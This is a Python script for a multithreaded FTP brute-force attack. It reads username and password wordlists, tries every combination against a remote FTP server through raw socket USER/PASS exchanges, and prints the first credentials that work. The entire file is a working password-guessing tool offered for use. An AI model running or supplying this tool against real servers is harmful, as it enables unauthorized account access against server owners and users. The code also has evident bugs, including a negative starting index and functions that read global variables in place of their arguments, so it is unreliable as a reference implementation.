import socket
import sys
from threading import Thread, enumerate, current_thread
from time import sleep
import ipaddress

def create_socket_connection(IP, PORT):
    try:
        TCP_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        TCP_SOCKET.connect((IP, PORT))
        header = TCP_SOCKET.recv(1024)
        header = str(header, 'utf-8')
        if '220' in header:
            return TCP_SOCKET
        else:
            print("Failed to connect")
            sys.exit()
    except OSError as e:
        print("Failed to Create connection with {}".format(IP))
        sys.exit()

def ftp_login(TCP_SOCKET, username, password):
    user_packet = "USER {}\r\n".format(username)
    byte_user_packet = bytes(user_packet, 'utf-8')

    pass_packet = "PASS {}\r\n".format(password)
    byte_pass_packet = bytes(pass_packet, 'utf-8')

    TCP_SOCKET.send(byte_user_packet)
    recv_data = TCP_SOCKET.recv(1024)
    recv_data = str(recv_data,'utf-8')

    if '331' in recv_data:
        TCP_SOCKET.send(byte_pass_packet)
        recv_data = TCP_SOCKET.recv(1024)
        recv_data = str(recv_data, 'utf-8')
        if '230' in recv_data:
            TCP_SOCKET.close()
            return True
        else:
            return False
    else:
        return False

def handle_login(thread_number, totel_thread, usernames, passwords, IP, PORT):
    global login_success
    for username in usernames:
        username = username.replace("\n","")
        for i in range(thread_number, len(passwords), totel_thread):
            password = passwords[i]
            password = password.replace("\n","")
            if login_success: 
                usernames = ""
                passwords = ""
                FTP_CONNECT.close()
                return

            FTP_CONNECT = create_socket_connection(IP, PORT)
            if ftp_login(FTP_CONNECT, username, password):
                print("Login success")
                print("=======================================")
                print("username = {}".format(username))
                print("password = {}".format(password))
                print("=======================================")
                login_success = True
                print("Press ctrl+c to exit this program")
                for t in enumerate():
                    if t != current_thread():
                        t.join() 
                return 
            else:
                if not login_success:
                    print("Failed as {}:{}".format(username, password))
                FTP_CONNECT.close()

def file_reader(filename):
    try:
        Read_data = open(filename, 'r')
        Data = Read_data.readlines()
        Read_data.close()
        return Data
    except FileNotFoundError:
        print("'{}' not found please provide correct path".format(userlist))
        sys.exit()

def validate_ip(ip_address):
    try:
        validate_ip = ipaddress.ip_address(IP)
    except ValueError:
        print("'{}' not valid IP, please provide an valid ip address".format(IP))
        sys.exit()


if __name__ == "__main__":
    login_success = False
    IP = input("Enter Remote server IP:")
    validate_ip(IP)
    PORT = int(input("Enter Remote server PORT:"))
    userlist = input("Enter username wordlist:")
    Usernames = file_reader(userlist)
    passlist = input("Enter password wordlist:")
    Passwords = file_reader(passlist)
    thread = int(input("How many thread you create:"))

    THREAD = []

    for thread_number in range(thread):
        new_thread = Thread(target=handle_login, args=(thread_number-1, thread, Usernames, Passwords, IP, PORT))
        new_thread.start()
        sleep(1)
        THREAD.append(new_thread)

    
    try:
        for thread in THREAD:
            thread.join()
    except KeyboardInterrupt:
        print("Exiting....")